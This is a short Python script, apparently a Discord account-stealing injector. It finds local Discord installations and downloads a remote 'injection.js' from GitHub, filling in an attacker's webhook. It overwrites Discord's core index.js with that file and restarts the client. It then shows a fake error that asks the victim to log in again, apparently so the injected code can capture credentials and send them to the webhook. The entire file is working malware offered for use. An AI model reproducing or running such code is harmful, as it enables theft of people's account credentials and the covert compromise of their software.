import os
import re
import tkinter
import requests
from tkinter import *
from tkinter import messagebox

webhook = 'your webhook'
win = Tk()
root = tkinter.Tk()
win.geometry("1x1")

def inject():
    for _dir in os.listdir(os.getenv('localappdata')):
        if 'discord' in _dir.lower():
            for __dir in os.listdir(os.path.abspath(os.getenv('localappdata')+os.sep+_dir)):
                if re.match(r'app-(\d*\.\d*)*', __dir):
                    abspath = os.path.abspath(os.getenv('localappdata')+os.sep+_dir+os.sep+__dir)
                    f = requests.get("https://raw.githubusercontent.com/Cryxyemi/Discord-Injection/master/injection.js").text.replace("%WEBHOOK%", webhook)
                    with open(abspath+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
                        indexFile.write(f)
                    os.startfile(abspath+os.sep+_dir+'.exe')
                    os.system("taskkill /f /im  Discord.exe")
                    root.withdraw()
                    messagebox.showerror('Injecting failed', 'Error: Please relog in your discord account and try again')

if __name__ == "__main__":
    inject()
